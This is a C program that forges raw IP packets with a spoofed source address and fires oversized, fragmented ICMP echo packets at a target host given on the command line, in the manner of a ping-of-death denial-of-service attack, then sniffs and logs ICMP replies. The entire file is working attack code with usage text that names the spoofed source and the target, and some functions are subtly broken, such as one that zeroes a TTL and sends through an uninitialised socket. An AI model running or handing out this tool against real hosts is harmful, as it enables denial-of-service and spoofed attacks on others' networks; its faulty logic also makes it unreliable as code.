#include <stdio.h>
#include<stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include<unistd.h>
#include <netinet/in.h>
#include<netinet/if_ether.h>  
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>

void ProcessPacket(unsigned char* , int);
void print_ip_header(unsigned char* , int);
void print_icmp_packet(unsigned char * , int );
void PrintData(unsigned char*,int);
int s;
struct sockaddr_in source,dest;
  struct hostent *hp, *hp2;
char buf[400];
struct ip *ip = (struct ip *)buf;
  struct sockaddr_in dst;
  int offset;
FILE *logfile;

int saddr_size,data_size;

int receiving_packets()  {
struct sockaddr saddr;
struct icmphdr *icmp = (struct icmphdr *)(ip) + 1;
unsigned char *buffer = (unsigned char *) malloc(65536);

    logfile=fopen("logGV3.txt","w");
    if(logfile==NULL)
    {
    printf("Unable to create log.txt file.");
    }
    printf("Starting...\n");
  
    int sock_raw=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));  
  if(sock_raw < 0)
    {
   
    perror("Socket Error");
    return 1;
    }
    while(1)
    {
        saddr_size = sizeof saddr;
       
        data_size = recvfrom(sock_raw,buffer,65536,0,&saddr,(socklen_t*)&saddr_size);
   
           if(data_size<0)
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
        
        ProcessPacket(buffer,data_size);
   
}
    close(sock_raw);
    printf("Finished");
     return 0;
}
void ProcessPacket(unsigned char* buffer, int size)
{
   
    struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
        if (iph->protocol == 1) 
          {
             print_icmp_packet(buffer,size);
            }
    }
void print_ethernet_header(unsigned char* Buffer, int Size)
{
    struct ethhdr *eth = (struct ethhdr *)Buffer;
    
    fprintf(logfile,"\n");
    fprintf(logfile, "Ethernet Header\n");
    fprintf(logfile,"   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5]);
    fprintf(logfile, "   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4], eth->h_source[5] );
    fprintf(logfile, "   |-Protocol            : %u \n",(unsigned short)eth->h_proto);
}
  void print_ip_header(unsigned char* Buffer, int Size)
{
    print_ethernet_header(Buffer , Size);

    unsigned short iphdrlen;
        
    struct iphdr *iph=(struct iphdr *)(Buffer+sizeof(struct ethhdr));
    iphdrlen =iph->ihl*4;
  struct icmphdr *icmp = (struct icmphdr *)(ip) + 1;

    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr;
  
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;
	iph->ttl=0;
	if(iph->ttl==0)
	{	
        ip->ip_v = 4;
        ip->ip_hl = sizeof*ip >> 2;
        ip->ip_tos = 0;
        ip->ip_len = htons(sizeof(buf));
        ip->ip_id = htons(4321);
        ip->ip_off = htons(0);
        ip->ip_ttl = 1;
        ip->ip_p = 1;
        ip->ip_sum = 0;
        dst.sin_addr = ip->ip_dst;
        dst.sin_family = AF_INET;
        icmp->type = 3;
        icmp->code = 0;
        
        icmp->checksum = htons(~(ICMP_ECHO << 8));
		printf("Send ICMP packets\n\n");
	for(offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip)))
        {
        ip->ip_off = htons(offset >> 3);
        if(offset < 65120)
         ip->ip_off |= htons(0x2000);
        else
          ip->ip_len = htons(418); 
        
        if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
        {
           fprintf(stderr, "offset %d: ", offset);
           perror("sendto() error");
        }
     else
       printf("sendto() is OK.\n");
       
        if(offset == 0)
        {
        icmp->type = 3;
        icmp->code = 0;
        icmp->checksum = 0;
        }
	else
	{
    fprintf(logfile, "\n");
    fprintf(logfile, "IP Header\n");
    fprintf(logfile, "   |-IP Version        : %d\n",(unsigned int)iph->version);
    fprintf(logfile, "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
    fprintf(logfile, "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
    fprintf(logfile, "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
    fprintf(logfile, "   |-Identification    : %d\n",ntohs(iph->id));
        fprintf(logfile, "   |-TTL      : %d\n",(unsigned int)iph->ttl);
    fprintf(logfile, "   |-Protocol : %d\n",(unsigned int)iph->protocol);
    fprintf(logfile, "   |-Checksum : %d\n",ntohs(iph->check));
    fprintf(logfile, "   |-Source IP        : %s\n",inet_ntoa(source.sin_addr));
    fprintf(logfile, "   |-Destination IP   : %s\n",inet_ntoa(dest.sin_addr));
	}
    }
}
}
  void print_icmp_packet(unsigned char* Buffer , int Size)
{
    unsigned short iphdrlen;
     
    struct iphdr *iph = (struct iphdr *)Buffer;
    iphdrlen = iph->ihl*4;
     
    struct icmphdr *icmph = (struct icmphdr *)(Buffer + iphdrlen);
             
    fprintf(logfile,"\n\n***********************ICMP Packet sent*************************\n");   
     
     print_ip_header(Buffer , Size);
    fprintf(logfile,"\n");
         
    fprintf(logfile,"ICMP Header\n");
    fprintf(logfile,"   |-Type : %d",(unsigned int)(icmph->type));
             
    if((unsigned int)(icmph->type) == 11) 
        fprintf(logfile,"  (TTL Expired)\n");
    else if((unsigned int)(icmph->type) == ICMP_ECHOREPLY) 
        fprintf(logfile,"  (ICMP Echo Reply)\n");
    fprintf(logfile,"   |-Code : %d\n",(unsigned int)(icmph->code));
    fprintf(logfile,"   |-Checksum : %d\n",ntohs(icmph->checksum));
    
    fprintf(logfile,"\n");
 
    fprintf(logfile,"IP Header\n");
    PrintData(Buffer,iphdrlen);
  
    fprintf(logfile,"Data Payload\n");  
    PrintData(Buffer + iphdrlen + sizeof icmph , (Size - sizeof icmph - iph->ihl * 4));
     
    fprintf(logfile,"\n###########################################################");
}
void PrintData(unsigned char* data , int Size)
{
    int i , j;
    for(i=0 ; i < Size ; i++)
    {
        if(i!=0&&i%16==0)  
        {
            fprintf(logfile,"        ");
            for(j=i-16;j<i;j++)
            {
                if(data[j]>=32&&data[j]<=128)
                    fprintf(logfile,"%c",(unsigned char)data[j]); 
                
                else fprintf(logfile,".");
            }
            fprintf(logfile,"\n");
        }
        
        if(i%16==0) fprintf(logfile,"  ");
            fprintf(logfile,"%02X",(unsigned int)data[i]);
                
        if(i==Size-1)
        {
            for(j=0;j<15-i%16;j++)
            {
              fprintf(logfile,"  "); 
            }
            
            fprintf(logfile,"        ");
            
            for(j=i-i%16;j<=i;j++)
            {
                if(data[j]>=32&&data[j]<=128)
                {
                  fprintf(logfile,"%c",(unsigned char)data[j]);
                }
                else
                {
                  fprintf(logfile,".");
                }
            }
            
            fprintf(logfile,"\n");
        }
    }
}

int main(int argc, char *argv[])
{
 int s, i;
  char buf[400];
  struct ip *ip = (struct ip *)buf;
  struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
  struct hostent *hp, *hp2;
  struct sockaddr_in dst;
  int offset;
  int on;
  int num = 100;
int saddr_size,data_size;
struct sockaddr saddr;
unsigned char *buffer = (unsigned char *) malloc(65536);//Its Big!
  if(argc < 3)
  {
     printf("\nUsage: %s <saddress> <dstaddress> [number]\n", argv[0]);
     printf("- saddress is the spoofed source address\n");
     printf("- dstaddress is the target\n");
     printf("- number is the number of packets to send, 100 is the default\n");
     exit(1);
   }
  if(argc == 4)
      
      num = atoi(argv[3]);
   
    for(i=1;i<=num;i++)
    {
       on = 1;
       bzero(buf, sizeof(buf));
      
       if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
       {
        perror("socket() error");
        
        exit(1);
       }
       if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
       {
        perror("setsockopt() for IP_HDRINCL error");
        exit(1);
       }
       if((hp = gethostbyname(argv[2])) == NULL)
       {
         if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1)
         {
            fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);
            exit(1);
         }
       }
       else
           bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
        
        if((hp2 = gethostbyname(argv[1])) == NULL)
        {
         if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1)
         {
             fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);
             exit(1);
         }
        }
        else
            bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
        printf("Sending to %s from spoofed %s\n", inet_ntoa(ip->ip_dst), argv[1]);
      
        ip->ip_v = 4;
        ip->ip_hl = sizeof*ip >> 2;
        ip->ip_tos = 0;
        ip->ip_len = htons(sizeof(buf));
        ip->ip_id = htons(4321);
        ip->ip_off = htons(0);
        ip->ip_ttl = 1;
        ip->ip_p = 1;
        ip->ip_sum = 0; 
        dst.sin_addr = ip->ip_dst;
        dst.sin_family = AF_INET;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
       
        icmp->checksum = htons(~(ICMP_ECHO << 8));
        for(offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip)))
        {
        ip->ip_off = htons(offset >> 3);
        if(offset < 65120)
         ip->ip_off |= htons(0x2000);
        else
          ip->ip_len = htons(418); 
        
        if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
        {
           fprintf(stderr, "offset %d: ", offset);
           perror("sendto() error");
        }
     else
       printf("sending......\n");
        
        if(offset == 0)
        {
        icmp->type = 3;
        icmp->code = 0;
        icmp->checksum = 0;
        }
       }
	    int sock_raw=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));	 
       data_size = recvfrom(sock_raw,buffer,65536,0,&saddr,(socklen_t*)&saddr_size);
      
      close(s);
      //usleep(300);
     }
     receiving_packets();

    return 0;
}
